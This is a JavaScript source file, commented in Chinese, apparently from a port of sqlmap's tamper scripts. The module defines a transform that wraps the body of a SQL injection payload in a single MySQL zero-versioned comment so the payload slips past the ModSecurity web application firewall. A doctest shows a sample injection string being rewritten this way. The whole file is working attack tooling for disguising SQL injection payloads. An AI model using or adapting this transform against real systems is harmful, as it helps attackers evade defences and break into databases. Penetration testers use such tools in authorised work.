// 上游形态变体（T-6，对标 sqlmap 1.10.10 modsecurityzeroversioned.py）：首个空格后整段包进
// 单条零版本注释 `/*!00000 ... */`（MySQL 对 0 版本号恒执行注释内语法）。确定性，无随机。
// 与本仓 modsecurityzeroversioned（逐关键词 `/*!00000 AND */`）形态不同族。
// 是否替换默认，由 modsec-live 真机 A/B 定 ⇒ 本件不动默认链（批次 D13）。
export const modsecurityzeroversionedblock = {
  name: 'modsecurityzeroversionedblock',
  description: '将首词后的整段包进单条 /*!00000...*/ 零版本注释（上游形态；ModSecurity 绕过族）',
  doctests: [
    { input: '1 AND 2>1--', output: '1 /*!00000AND 2>1*/--' },
  ],
  dbms: ['MySQL'], // [P1-FIX] 方言限定：异构库下无效，运行时告警
  /**
   * @param {string} payload
   * @returns {string}
   */
  transform(payload) {
    const original = String(payload ?? '');
    if (!original) return original;
    let body = original;
    let postfix = '';
    for (const marker of ['#', '--', '/*']) {
      const idx = body.indexOf(marker);
      if (idx !== -1) {
        postfix = body.slice(idx);
        body = body.slice(0, idx);
        break;
      }
    }
    const sp = body.indexOf(' ');
    if (sp === -1) return original; // 上游：无空格 ⇒ 原样返回
    return `${body.slice(0, sp)} /*!00000${body.slice(sp + 1)}*/${postfix}`;
  },
};

export default modsecurityzeroversionedblock;
